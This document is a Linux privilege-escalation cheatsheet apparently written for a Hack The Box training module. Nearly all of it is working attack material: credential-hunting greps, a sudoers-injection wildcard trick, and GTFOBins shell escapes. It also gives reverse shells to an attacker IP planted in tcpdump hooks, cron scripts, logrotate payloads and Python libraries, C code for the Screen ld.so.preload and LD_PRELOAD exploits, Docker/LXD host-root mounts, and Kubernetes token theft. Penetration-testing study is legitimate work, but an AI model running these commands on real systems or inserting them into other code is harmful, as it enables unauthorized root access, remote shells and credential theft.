# Linux Privilege Escalation Cheatsheet
> HTB Linux Privilege Escalation Module — Quick Reference

---

## Table of Contents

- [1. Information Gathering](#1-information-gathering)
  - [1.1 Basic System Information](#11-basic-system-information)
  - [1.2 OS and Kernel](#12-os-and-kernel)
  - [1.3 Defenses](#13-defenses)
  - [1.4 Drives and Shares](#14-drives-and-shares)
  - [1.5 Users and Groups](#15-users-and-groups)
  - [1.6 File System and Hidden Files](#16-file-system-and-hidden-files)
- [2. Services and Internals Enumeration](#2-services-and-internals-enumeration)
  - [2.1 Network Information](#21-network-information)
  - [2.2 User and Login Information](#22-user-and-login-information)
  - [2.3 Scheduled Tasks](#23-scheduled-tasks)
  - [2.4 Process Information](#24-process-information)
  - [2.5 Installed Packages and Binaries](#25-installed-packages-and-binaries)
  - [2.6 Configuration Files and Scripts](#26-configuration-files-and-scripts)
- [3. Credential Hunting](#3-credential-hunting)
  - [3.1 Credential Hunting](#31-credential-hunting)
  - [3.2 SSH Keys](#32-ssh-keys)
- [4. Environment-based Privilege Escalation](#4-environment-based-privilege-escalation)
  - [4.1 PATH Abuse](#41-path-abuse)
  - [4.2 Wildcard Abuse](#42-wildcard-abuse)
  - [4.3 Escaping Restricted Shells](#43-escaping-restricted-shells)
- [5. Permissions-based Privilege Escalation](#5-permissions-based-privilege-escalation)
  - [5.1 SUID / SGID Binaries](#51-suid--sgid-binaries)
  - [5.2 Sudo Rights Abuse](#52-sudo-rights-abuse)
  - [5.3 Privileged Groups](#53-privileged-groups)
  - [5.4 Linux Capabilities](#54-linux-capabilities)
- [6. Service-based Privilege Escalation](#6-service-based-privilege-escalation)
  - [6.1 Vulnerable Services (Screen)](#61-vulnerable-services-screen)
  - [6.2 Cron Job Abuse](#62-cron-job-abuse)
  - [6.3 LXD / LXC](#63-lxd--lxc)
  - [6.4 Docker](#64-docker)
  - [6.5 Kubernetes](#65-kubernetes)
  - [6.6 Logrotate](#66-logrotate)
  - [6.7 Miscellaneous Techniques](#67-miscellaneous-techniques)
- [7. Linux Internals-based Privilege Escalation](#7-linux-internals-based-privilege-escalation)
  - [7.1 Kernel Exploits](#71-kernel-exploits)
  - [7.2 Shared Libraries (LD\_PRELOAD)](#72-shared-libraries-ld_preload)
  - [7.3 Shared Object Hijacking](#73-shared-object-hijacking)
  - [7.4 Python Library Hijacking](#74-python-library-hijacking)
- [8. Quick Reference](#8-quick-reference)

---

## 1. Information Gathering

### 1.1 Basic System Information

```bash
whoami
id
hostname
ip a
sudo -l
```

### 1.2 OS and Kernel

```bash
cat /etc/os-release
uname -a
echo $PATH
env
lscpu
cat /etc/shells
```

### 1.3 Defenses

> ⚠️ May require root or sudo.

```bash
iptables -L
apparmor_status
sestatus
ufw status
fail2ban-client status
snort -V
```

### 1.4 Drives and Shares

```bash
lsblk
lpstat
cat /etc/fstab
route -n
netstat -rn
cat /etc/resolv.conf
arp -a
```

### 1.5 Users and Groups

```bash
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
grep "*sh$" /etc/passwd
cat /etc/group
getent group sudo
ls /home
```

### 1.6 File System and Hidden Files

```bash
df -h
cat /etc/fstab | grep -v "#" | column -t

# Find hidden files owned by htb-student
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

# Find hidden directories
find / -type d -name ".*" -ls 2>/dev/null

# Check common temp directories
ls -l /tmp /var/tmp /dev/shm
```

---

## 2. Services and Internals Enumeration

### 2.1 Network Information

```bash
ip a
cat /etc/hosts
```

### 2.2 User and Login Information

```bash
lastlog
w
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

### 2.3 Scheduled Tasks

```bash
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
cat /etc/crontab
ls -la /var/spool/cron/crontabs
```

### 2.4 Process Information

```bash
# Dump all process command lines
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Look for root-owned processes
ps aux | grep root
```

### 2.5 Installed Packages and Binaries

```bash
# List installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# Check sudo version
sudo -V

# List common binary directories
ls -l /bin /usr/bin/ /usr/sbin/

# Cross-reference installed packages with GTFOBins
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do
    if grep -q "$i" installed_pkgs.list; then
        echo "Check GTFO for: $i"
    fi
done
```

### 2.6 Configuration Files and Scripts

```bash
# Find all config files
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null

# Find all shell scripts (excluding common noise)
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

---

## 3. Credential Hunting

### 3.1 Credential Hunting

```bash
# Web files
find /var/www/ -type f -name "*.php" -exec grep -iE 'DB_USER|DB_PASSWORD|password|user|pass' {} \; 2>/dev/null

# Mail and spool
find /var/mail/ -type f -exec grep -iE 'password|user|pass' {} \; 2>/dev/null
find /var/spool/ -type f -exec grep -iE 'password|user|pass' {} \; 2>/dev/null

# Config files (system-wide)
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null -exec grep -iE 'password|user|pass' {} \; 2>/dev/null

# Various file types
find / -type f -name "*.conf" -exec grep -iE 'password|user|pass' {} \; 2>/dev/null
find / -type f -name "*.xml"  -exec grep -iE 'password|user|pass' {} \; 2>/dev/null
find / -type f -name "*.bak"  -exec grep -iE 'password|user|pass' {} \; 2>/dev/null
find / -type f -name "*.sql"  -exec grep -iE 'password|user|pass' {} \; 2>/dev/null
find / -type f -name "*.txt"  -exec grep -iE 'password|user|pass' {} \; 2>/dev/null

# Shell history and known_hosts
grep -iE 'password|user|pass' ~/.bash_history
grep -iE 'password|user|pass' ~/.ssh/known_hosts
```

### 3.2 SSH Keys

```bash
ls ~/.ssh/
cat ~/.ssh/known_hosts
find /home/ -name id_rsa 2>/dev/null
find /root/ -name id_rsa 2>/dev/null
```

---

## 4. Environment-based Privilege Escalation

### 4.1 PATH Abuse

**Concept:** If a SUID binary or sudo-allowed command calls another binary without an absolute path, a malicious binary placed earlier in `$PATH` will be executed instead.

```bash
# Check current PATH
echo $PATH

# Add current directory to the front of PATH
PATH=.:$PATH
export PATH

# Example: create a malicious 'ls' in current directory
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls   # Will execute your script instead
```

### 4.2 Wildcard Abuse

**Concept:** If a cron job runs `tar` on a directory you can write to, specially named files can inject arguments.

```bash
# Create the malicious payload files
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# Wait for the cron job to execute, then verify
ls -la
sudo -l

# If successful, escalate
sudo su
```

### 4.3 Escaping Restricted Shells

```bash
# Enumerate allowed commands
ls; pwd; whoami; id; echo $PATH; env

# Command substitution
echo $(whoami)
ls -l `pwd`

# Command chaining
ls; whoami
pwd && id
cat /etc/passwd | grep root

# Manipulate environment variables
export PATH=/bin:/usr/bin:/sbin:/usr/sbin
export SHELL=/bin/bash
$SHELL

# Spawn shells via common binaries
python3 -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
awk 'BEGIN {system("/bin/sh")}'
find / -exec /bin/sh \;

# vi / vim escape
vi
# Inside vi:
# :!/bin/sh
# :set shell=/bin/bash | :shell

# less / more / man escape
less /etc/passwd
# Inside less:
# !/bin/sh

# nmap (older versions)
nmap --interactive
# Inside nmap:
# !sh
```

> 💡 Always cross-reference available binaries against [GTFOBins](https://gtfobins.github.io/).

---

## 5. Permissions-based Privilege Escalation

### 5.1 SUID / SGID Binaries

```bash
# Find SUID binaries owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find SGID binaries owned by root
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Find all SUID binaries (any owner)
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Common GTFOBins exploitation examples:**

```bash
# vim (SUID)
vim -c ':!/bin/sh'

# find (SUID)
find / -exec /bin/sh -p \; -quit

# nmap (SUID, older versions)
nmap --interactive
!sh

# less (SUID)
less /etc/passwd
!/bin/sh
```

> 💡 `setuid` runs the binary as the file owner; `setgid` runs it as the file's group. If owned by root, the binary executes with root privileges.

### 5.2 Sudo Rights Abuse

```bash
# Check sudo privileges
sudo -l

# Identify dangerous entries
sudo -l | grep -E '(tcpdump|vim|nmap|find|less|\*)'
```

**GTFOBins sudo examples:**

```bash
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/passwd    # then: !/bin/sh
sudo zip -TT 'sh #' /dev/null
sudo systemctl --force --batch enable 'sh -c "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1".service'
```

**tcpdump `-z` exploit (if allowed via sudo):**

```bash
# Create reverse shell payload
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <YOUR_PORT> >/tmp/f' > /tmp/.test
chmod +x /tmp/.test

# Start listener on attacker machine
nc -lnvp <YOUR_PORT>

# Execute
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### 5.3 Privileged Groups

#### LXD Group

```bash
id   # Confirm lxd group membership

# Import and configure a privileged container
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh

# Access host filesystem from inside container
cd /mnt/root/root
id   # Should show root
```

#### Docker Group

```bash
id   # Confirm docker group membership
docker run -v /root:/mnt -it ubuntu
# Inside container:
cd /mnt
ls -la
```

#### Disk Group

```bash
id   # Confirm disk group membership
lsblk
sudo debugfs -w /dev/sda1
# Inside debugfs: navigate, cat files, etc.
```

#### ADM Group (Log Reading)

```bash
id   # Confirm adm group membership
ls -la /var/log/
cat /var/log/syslog
cat /var/log/auth.log
grep "password" /var/log/auth.log
```

### 5.4 Linux Capabilities

```bash
# Enumerate capabilities on common binary paths
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# List capabilities of a specific file
getcap /usr/bin/vim.basic

# Check current process capability sets
cat /proc/self/status | grep Cap
cat /proc/self/status | grep CapBnd

# Check capabilities of a running process
sudo cat /proc/$(pidof processname)/status | grep Cap
```

**`cap_dac_override` — bypass file permission checks:**

```bash
# Read a restricted file (e.g., /etc/shadow)
/usr/bin/vim.basic /etc/shadow
```

**`cap_setuid` — change UID to root (requires compiled C program):**

```c
// setuid.c
#include <unistd.h>
#include <sys/capability.h>
#include <stdio.h>

int main() {
    cap_value_t cap_list[1];
    cap_list[0] = CAP_SETUID;
    cap_t caps = cap_get_proc();
    cap_set_flag(caps, CAP_EFFECTIVE, 1, cap_list, CAP_SET);
    cap_set_proc(caps);
    cap_free(caps);
    setuid(0);
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```

```bash
gcc setuid.c -o setuid -lcap
sudo setcap cap_setuid+ep ./setuid
./setuid
```

> ⚠️ **Dangerous capabilities:** `cap_sys_admin`, `cap_setuid`, `cap_setgid`, `cap_dac_override`.

---

## 6. Service-based Privilege Escalation

### 6.1 Vulnerable Services (Screen)

**Affects:** Screen ≤ 4.5.0 — arbitrary file write via log file creation, allowing `ld.so.preload` abuse.

```bash
screen -v   # Confirm version
```

**Manual exploitation:**

```bash
# Step 1: Create malicious shared library
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

# Step 2: Create root shell binary
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
#include <unistd.h>

int main(void){
    setuid(0); setgid(0); seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration

# Step 3: Write to ld.so.preload via screen's log feature
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

# Step 4: Trigger the SUID screen binary to load the library
screen -ls

# Step 5: Execute root shell
/tmp/rootshell

# Cleanup
rm /tmp/libhax.so /tmp/rootshell /etc/ld.so.preload
```

### 6.2 Cron Job Abuse

```bash
# Check cron jobs
crontab -l
sudo crontab -l
cat /etc/crontab
ls -lah /etc/cron.d/

# Find world-writable files (potential cron scripts)
find / -path /proc -prune -o -type f -perm -o+w -exec ls -lah {} + 2>/dev/null

# Monitor processes with pspy (detect cron execution)
chmod +x pspy64
./pspy64 -pf -i 1000
```

**Exploit a writable cron script:**

```bash
# Backup original
cp /dmz-backups/backup.sh /dmz-backups/backup.sh.bak

# Inject reverse shell
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1" >> /dmz-backups/backup.sh

# Listen for connection
nc -lnvp 443

# Restore after testing
cp /dmz-backups/backup.sh.bak /dmz-backups/backup.sh
```

**Inject a malicious cron entry (if `/etc/cron.d/` is writable):**

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'" >> /etc/cron.d/vulnerable_cron
```

### 6.3 LXD / LXC

```bash
id   # Confirm lxd group membership

lxc image list
lxc list

# Import image and create privileged container
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash

# Access host filesystem
ls -l /mnt/root

# Check if container is privileged
lxc config show <container_name> | grep security.privileged
```

### 6.4 Docker

```bash
id   # Confirm docker group membership
docker version
docker image ls
docker ps -a

ls -l /var/run/docker.sock   # Check socket permissions

# Run privileged container with host root mount
docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem <image_name>
docker -H unix:///var/run/docker.sock exec -it <container_id> /bin/bash

# Inside container: access host files
cat /hostsystem/root/.ssh/id_rsa

# Chroot into host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### 6.5 Kubernetes

```bash
# Access Kubelet API
curl https://<NODE_IP>:10250/pods -k | jq

# kubeletctl commands
kubeletctl -i --server <NODE_IP> pods
kubeletctl -i --server <NODE_IP> scan rce
kubeletctl -i --server <NODE_IP> exec "id" -p <pod_name> -c <container_name>

# Extract service account token and cert
kubeletctl -i --server <NODE_IP> exec \
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
    -p <pod_name> -c <container_name> | tee k8.token

kubeletctl --server <NODE_IP> exec \
    "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
    -p <pod_name> -c <container_name> | tee ca.crt

export token=$(cat k8.token)

# Use kubectl with extracted credentials
kubectl --token=$token --certificate-authority=ca.crt \
    --server=https://<API_SERVER_IP>:6443 auth can-i --list

kubectl --token=$token --certificate-authority=ca.crt \
    --server=https://<API_SERVER_IP>:6443 apply -f privesc.yaml

kubectl --token=$token --certificate-authority=ca.crt \
    --server=https://<API_SERVER_IP>:6443 get pods
```

**General kubectl enumeration:**

```bash
kubectl get pods -A
kubectl get svc -A
kubectl get deployments -A
kubectl get ns
kubectl get secrets -A -o yaml
kubectl get sa -A -o yaml
kubectl get roles -A -o yaml
kubectl get rolebindings -A -o yaml
```

### 6.6 Logrotate

**Affects:** logrotate 3.8.6, 3.11.0, 3.15.0, 3.18.0 — exploitable when logrotate runs as root and attacker has write access to the log file.

```bash
logrotate --version
cat /etc/logrotate.conf
ls /etc/logrotate.d/
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Clone and compile logrotten
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# Create reverse shell payload
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload

# Start listener
nc -nlvp <PORT>

# Run exploit
./logrotten -p ./payload /tmp/tmp.log
```

### 6.7 Miscellaneous Techniques

#### Passive Traffic Capture

```bash
sudo tcpdump -i <interface> -w capture.pcap

# Analyze for credentials
tshark -r capture.pcap -T fields \
    -e http.authorization -e ftp.password \
    -e pop.password -e imap.password \
    -e telnet.password -e smtp.password
```

#### Weak NFS Privileges (`no_root_squash`)

```bash
showmount -e <NFS_SERVER_IP>
cat /etc/exports

sudo mount -t nfs <NFS_SERVER_IP>:/<export_path> /mnt

# Create SUID binary on attacker machine and copy to mount
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc shell.c -o shell
cp shell /mnt
sudo chmod u+s /mnt/shell

sudo umount /mnt

# Execute on target
./shell
```

#### Hijacking Tmux Sessions

```bash
# Find running tmux processes
ps aux | grep tmux

# Check socket permissions
ls -la <tmux_socket>

# Attach to session
tmux -S <tmux_socket> attach
```

---

## 7. Linux Internals-based Privilege Escalation

### 7.1 Kernel Exploits

```bash
# Gather kernel info
uname -a
cat /etc/lsb-release

# Search for exploits
searchsploit "Linux kernel 4.4.0-116"
# Or search online: https://www.exploit-db.com

# Download, compile, and run
wget <exploit_url>
gcc <exploit>.c -o <exploit>
chmod +x <exploit>
./<exploit>

whoami; id   # Verify root
```

### 7.2 Shared Libraries (LD_PRELOAD)

**Prerequisite:** `sudo -l` shows `env_keep += LD_PRELOAD`.

```bash
# Create malicious library
cat > /tmp/root.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

# Exploit via a sudo-allowed command
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id; whoami
```

### 7.3 Shared Object Hijacking

**Concept:** If a SUID binary has a writable `RUNPATH` directory, place a malicious `.so` there to hijack library loading.

```bash
# Identify SUID binary and its dependencies
ls -la <binary>
ldd <binary>
readelf -d <binary> | grep PATH

# Check if RUNPATH directory is writable
ls -la <runpath_directory>

# Run binary to identify missing symbol
./<binary>

# Create malicious shared object
cat > src.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void <missing_symbol>() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF
gcc src.c -fPIC -shared -o <runpath_directory>/<library_name>.so

# Run the vulnerable binary
./<binary>

id; whoami
```

### 7.4 Python Library Hijacking

**Techniques:**

1. **Writable library file** — modify the imported `.py` file directly.
2. **Writable `sys.path` directory** — place a malicious module earlier in the search path.
3. **`PYTHONPATH` abuse** — if preserved via sudo, point to a malicious directory.

```bash
# Check script permissions and contents
ls -l <script>.py
cat <script>.py

# Find where the imported library lives
grep -r "def <function_name>" /usr/local/lib/python3.8/dist-packages/<lib>/

# Check library file permissions
ls -l /usr/local/lib/python3.8/dist-packages/<lib>/__init__.py

# If writable, inject malicious code
nano /usr/local/lib/python3.8/dist-packages/<lib>/__init__.py
# Add: import os; os.system("bash -i >& /dev/tcp/<IP>/<PORT> 0>&1")

# Run the script (with sudo if required)
sudo python3 <script>.py
```

---

## 8. Quick Reference

| Goal | Command |
|------|---------|
| Current user & privileges | `id`, `whoami`, `sudo -l` |
| Kernel version | `uname -a` |
| OS version | `cat /etc/lsb-release` |
| Active users | `w`, `lastlog` |
| SUID binaries | `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` |
| SGID binaries | `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` |
| World-writable files | `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` |
| World-writable directories | `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` |
| Capabilities | `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` |
| Cron jobs | `cat /etc/crontab`, `ls -la /etc/cron.*` |
| Monitor background processes | `./pspy64 -pf -i 1000` |
| Shared library deps | `ldd <binary>` |
| Binary RUNPATH | `readelf -d <binary> \| grep PATH` |
| NFS exports | `showmount -e <IP>`, `cat /etc/exports` |
| Screen version | `screen -v` |
| Logrotate version | `logrotate --version` |
| System audit | `./lynis audit system` |
| Add `.` to PATH | `PATH=.:${PATH}; export PATH` |
| LD_PRELOAD escalation | `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` |

> 🔗 **Resources**
> - [GTFOBins](https://gtfobins.github.io/) — Unix binaries for privilege escalation
> - [Exploit-DB](https://www.exploit-db.com) — Kernel and service exploits
> - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Comprehensive payload reference
> - [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — Linux PrivEsc techniques
